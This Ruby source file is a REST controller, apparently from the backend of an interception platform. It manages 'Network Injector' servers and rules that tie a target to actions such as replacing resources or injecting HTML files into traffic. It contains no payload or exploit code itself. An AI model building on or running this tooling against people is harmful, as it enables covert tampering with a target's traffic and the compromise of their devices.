#
# Controller for the Injector objects
#

require_relative '../frontend'

module RCS
module DB

class InjectorController < RESTController

  def index
    require_auth_level :server, :sys, :tech

    mongoid_query do
      result = ::Injector.all

      return ok(result)
    end
  end

  def show
    require_auth_level :server, :sys, :tech

    mongoid_query do
      injector = ::Injector.find(@params['_id'])
      return ok(injector)
    end
  end

  def create
    require_auth_level :sys
    require_auth_level :sys_injectors

    return conflict('LICENSE_LIMIT_REACHED') unless LicenseManager.instance.check :injectors

    result = Injector.create(name: @params['name'],
                             address: @params['address'],
                             port: @params['port'],
                             poll: @params['poll'],
                             configured: false,
                             redirect: 'auto',
                             redirection_tag: 'cdn')

    Audit.log :actor => @session.user[:name], :action => 'injector.create', :desc => "Created the injector '#{@params['name']}'"

    return ok(result)
  end

  def update
    require_auth_level :sys
    require_auth_level :sys_injectors

    mongoid_query do
      injector = Injector.find(@params['_id'])
      @params.delete('_id')

      @params.each_pair do |key, value|
        if injector[key.to_s] != value and not key['_ids']
          Audit.log :actor => @session.user[:name], :action => 'injector.update', :desc => "Updated '#{key}' to '#{value}' for injector '#{injector['name']}'"
        end
      end

      injector.update_attributes(@params)

      return ok(injector)
    end
  end

  def destroy
    require_auth_level :sys
    require_auth_level :sys_injectors

    mongoid_query do
      injector = Injector.find(@params['_id'])

      Audit.log :actor => @session.user[:name], :action => 'injector.destroy', :desc => "Deleted the injector '#{injector.name}'"

      injector.destroy

      return ok
    end
  end

  def version
    require_auth_level :server

    mongoid_query do
      injector = Injector.find(@params['_id'])
      @params.delete('_id')

      injector.version = @params['version']
      injector.save

      return ok
    end
  end

  def config
    require_auth_level :server, :sys
    
    mongoid_query do
      injector = ::Injector.find(@params['_id'])

      return not_found if injector[:_grid].nil?

      # reset the flag for the "configuration needed"
      injector.configured = true
      injector.save

      return stream_grid(injector[:_grid])
    end
  end

  def logs
    mongoid_query do
      injector = ::Injector.find(@params['_id'])

      case @request[:method]
        when 'GET'
          require_auth_level :sys, :tech
          
          logs = CappedLog.collection_class(injector[:_id]).all.order_by([[:_id, :asc]])
          return ok(logs)

        when 'POST'
          require_auth_level :server

          entry = CappedLog.dynamic_new injector[:_id]
          entry.time = Time.parse(@params['time']).getutc.to_i
          entry.type = @params['type'].downcase
          entry.desc = @params['desc']
          entry.save
          return ok
      end

      return bad_request
    end
  end

  def del_logs
    require_auth_level :sys, :tech

    mongoid_query do
      injector = Injector.find(@params['_id'])

      # we cannot call delete_all on a capped collection, must drop it
      CappedLog.collection_class(injector[:_id]).collection.drop

      return ok
    end
  end

  # rule creation and modification
  def add_rule
    require_auth_level :tech
    require_auth_level :tech_ni_rules

    mongoid_query do
      injector = ::Injector.find(@params['_id'])

      rule = ::InjectorRule.new
      rule.enabled = @params['rule']['enabled']
      rule.probability = @params['rule']['probability']
      rule.disable_sync = @params['rule']['disable_sync']
      rule.ident = @params['rule']['ident']
      rule.ident_param = @params['rule']['ident_param']
      rule.resource = @params['rule']['resource']
      rule.action = @params['rule']['action']
      rule.action_param = @params['rule']['action_param']
      rule.action_param_name = @params['rule']['action_param_name']
      rule.scout = @params['rule']['scout']

      target = ::Item.find(@params['rule']['target_id'].first)
      return not_found("Target not found") if target.nil?

      rule.target_id = [ target[:_id] ]

      # the file is uploaded to the grid before calling this method
      if (rule.action == 'REPLACE' or rule.action == 'INJECT-HTML-FILE') and not @params['rule']['action_param'].nil?
        path = Config.instance.temp(@params['rule']['action_param'])
        if File.exist?(path) and File.file?(path)
          rule[:_grid] = GridFS.put(File.open(path, 'rb+') {|f| f.read}, {filename: @params['rule']['action_param']})
          File.unlink(path)
        end
      end
      
      Audit.log :actor => @session.user[:name], :action => 'injector.add_rule',
                :desc => "Added a rule to the injector '#{injector.name}'\n#{rule.ident} #{rule.ident_param} #{rule.resource} #{rule.action} #{rule.action_param}"

      injector.rules << rule
      injector.save

      return ok(rule)
    end
  end

  def del_rule
    require_auth_level :tech
    require_auth_level :tech_ni_rules

    mongoid_query do
      injector = ::Injector.find(@params['_id'])
      rule = injector.rules.find(@params['rule']['_id'])
      target = ::Item.find(rule.target_id.first)

      Audit.log :actor => @session.user[:name], :action => 'injector.del_rule', :target_name => target.name,
                :desc => "Deleted a rule from the injector '#{injector.name}'\n#{rule.ident} #{rule.ident_param} #{rule.resource} #{rule.action} #{rule.action_param}"

      injector.rules.where(_id: rule[:_id]).delete_all
      injector.save

      return ok
    end
  end

  def update_rule
    require_auth_level :tech, :sys

    mongoid_query do

      injector = ::Injector.find(@params['_id'])
      rule = injector.rules.find(@params['rule']['_id'])

      @params.delete('_id')
      unless @params['rule']['target_id'].nil?
        target = ::Item.find(@params['rule']['target_id'].first)
        @params['rule']['target_id'] = [ target[:_id] ]
      end

      rule.update_attributes(@params['rule'])

      # remove any grid pointer if we are changing the type of action
      if (rule.action != 'REPLACE' and rule.action != 'INJECT-HTML-FILE')
        GridFS.delete rule[:_grid] unless rule[:_grid].nil?
        rule[:_grid] = nil
      end
      
      # the file is uploaded to the grid before calling this method
      if (rule.action == 'REPLACE' or rule.action == 'INJECT-HTML-FILE') and not @params['rule']['action_param'].nil?
        path = Config.instance.temp(@params['rule']['action_param'])
        if File.exist?(path) and File.file?(path)
          # delete any previous file in the grid
          GridFS.delete rule[:_grid] unless rule[:_grid].nil?
          rule[:_grid] = GridFS.put(File.open(path, 'rb+') {|f| f.read}, {filename: @params['rule']['action_param']})
          File.unlink(path)
        end
      end

      rule.save
      
      Audit.log :actor => @session.user[:name], :action => 'injector.update_rule',
                :desc => "Modified a rule on the injector '#{injector.name}'\n#{rule.ident} #{rule.ident_param} #{rule.resource} #{rule.action} #{rule.action_param}"

      return ok(rule)
    end
  end

  def upgrade
    require_auth_level :server, :sys

    mongoid_query do
      injector = ::Injector.find(@params['_id'])

      case @request[:method]
        when 'GET'
          return not_found unless injector.upgradable

          trace :info, "Upgrading #{injector.name}"

          build = Build.factory(:injector)
          build.load(nil)
          build.unpack

          injector.upgradable = false
          injector.save

          return stream_file(build.path('injector.deb'), proc { build.clean })

        when 'POST'
          Audit.log :actor => @session.user[:name], :action => 'injector.upgrade', :desc => "Upgraded the Network Injector '#{injector[:name]}'"

          injector.upgradable = true
          injector.save

          return server_error("Cannot push to #{injector.name}") unless Frontend.nc_push(injector)

          return ok
      end
    end
  end

end

end #DB::
end #RCS::
